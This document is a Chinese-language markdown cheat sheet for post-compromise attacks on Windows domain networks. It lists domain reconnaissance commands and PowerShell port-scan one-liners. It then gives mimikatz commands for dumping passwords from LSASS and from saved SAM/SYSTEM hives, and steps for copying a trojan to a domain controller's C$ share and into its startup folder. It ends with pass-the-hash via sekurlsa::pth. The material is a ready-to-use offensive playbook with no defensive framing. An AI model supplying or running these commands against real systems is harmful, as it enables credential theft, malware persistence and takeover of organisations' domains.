# 内网渗透(精简版)

> 假如拿到的机器是  **`Windows`**



## 内网信息收集

**查看主机信息**

```
net user
```

```
whoami
```

```
ipconfig /all
```

c![image-20230327190037793](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/202303271900918.png)



**查看域信息**

> 查询域用户

```
net user /domain
```



> 查询域 组

```
net group /domain
```



> 查看当前域计算机列表 第二个查的更多

```
net view & net group "domain computers" /domain
```



> 查看几个域

```
net view /domain
```



> 查询域管理员

```
net group "domain admins" /domain
```



> 查询 其他的域

```
net group "domain controllers" /domain
```



> 查询当前时间

```
net time /domain
```



> 查询域工作站

```
net config workstation
```



> 查询域凭证

```
cmdkey /list
```



> 查看 dc 域内共享文件

```
net view \\\\dc 
```



> 这个也是查域管，是升级为域控时，本地账户也成为域管

```
net localgroup administrators /domain /
```



>  当前登录域 - 计算机名 - 用户名

```
net config workstation 
```



> 相当于这个帐号登录域内主机，可访问资源

```
net use \\\\域控(如 pc.xx.com) password /user:xxx.com\username 
```



> 这也是一条收集信息的

```
tasklist /svc
```



> 在攻击机上 `ping` 目标主机, 一次获取 `目标主机的ip`

![image-20230327191709213](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/202303271917275.png)



> 如果`ping被禁止了`, 使用下方的命令

```
nslookup 目标主机
```



> 查看远程计算机 tasklist

```
tasklist /S ip /U domain\username /P /V 
```



> 查看当前是不是属于管理组

```
net localgroup administrators && whoami 
```

netstat -ano



> 查看域控

```
nltest /dclist:xx 
```



> 查看 Mandatory Label uac 级别和 sid 号

```
whoami /all 
```



> 查看远程连接 session (需要管理权限)

```
net sessoin 
```



> 共享目录

```
net share 
```



> 查看保存登陆凭证

```
cmdkey /l 
```



> 查看登陆域

```
echo %logonserver% 
```



> 记录

```
spn –l administrator spn 
```



> 环境变量

```
set 
```



查找目录中的 AD DC/LDS 实例

```
dsquery server - 
```



> 查找目录中的用户

```
dsquery user - 
```



> 查询所有计算机名称 windows 2003

```
dsquery computer 
```



> 查找指定目录下及子目录下没隐藏文件

```
dir /s *.exe 
```



# 内网扫描

> 查看本机`ping缓存`

```
arp -a 
```



> 使用内网扫描工具, 例如nbtscan 等 , 当然能上传这个工具到域上, 就上传,不能上传(有杀软)



> bat命令发现主机

```
for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1|find /i "ttl="
```



> 针对单个ip多个端口扫描

```
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("要扫描的主机ip",$_)) "Port $_ is open!"} 2>$null
```



> 针对某ip段中的单个端口扫描

```
foreach ($ip in 0..255) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 要扫描的主机的ip.$ip}
```



>  针对多个IP段多个端口的扫描

```
0..255 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("要扫毛的主机ip的前三位.$a",$_)) "Port $_ is open!"} 2>$null}
```



> 因为用户登录后会留下token, 所以可以尝试使用 工具 incognito.exe  去拿到` system token`

```
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
```



# 哈希抓取

>  使用`mimikaz` 抓取 账号密码 , 这个工具得传到域控主机 , 也就是在线抓取`lsess.exe`进程

```
privilege::debug  
sekurlsa::logonpasswords
```

>  离线抓取SAM文件
> 从远程服务器的SAM文件中导出这两个文件

```
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

下载到本地电脑

```
privilege::debug
lsadump::sam /sam:sam.hive /system:system.hive
```





# 内网横向

# ipc 横向

> 域内默认会开启共享的, 方便管理员管理（**C 盘, D盘, 以及系统目录admin$通常C:/windows**）

**IPC横向利用条件是 :  `是否开启445 端口`**

> 连接域控主机的C盘

```
net use //目标ip/c$ "密码" /user:地址名(例如wang.club)\administrator
```

> 查看是否连接成功

```
net use
```



> 查看控制主机的C盘

```
dir \\域控ip\c$
```



> 上传只做好的木马, 到目标主机的c盘

```
copy 攻击者的木马文件 \\域控主机的ip\c$
```

**注意: 实际中将该木马文件上到目标靶机的自启动文件夹下 , 实现木马开机自启**





# pth 横向
原理就是利用: NTLM身份认证
攻击适用于：
明文密码没抓出来
可以活得hash 但是没有爆破出来
内网中存在和当前机器相同的密码

1. 提升权限(**使用工具mimikatz**)

```
privilege:: debug
```

2. 反弹shell

```
sekurlsa::pth /user:administrator /domain:域控名称 /ntlm:之前抓取到的哈希  
```

![image-20230327213422929](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230327213422929.png)

反弹出终端机成功啦!!!